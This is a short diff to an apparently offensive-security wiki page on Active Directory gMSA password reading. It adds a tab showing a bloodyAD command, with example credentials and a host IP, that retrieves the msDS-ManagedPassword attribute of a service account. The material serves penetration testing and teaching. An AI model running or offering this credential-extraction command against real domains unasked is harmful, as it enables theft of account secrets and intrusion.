@@ -65,6 +65,14 @@ The second one relies on [GMSAPasswordReader](https://github.com/rvazarkar/GMSAP
 .\GMSAPasswordReader.exe --AccountName 'Target_Account'
 ```
 {% endtab %}
+
+{% tab title="Windows/UNIX-like" %}
+It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
+```bash
+bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword
+```
+{% endtab %}
+
 {% endtabs %}
 
 ## Resources
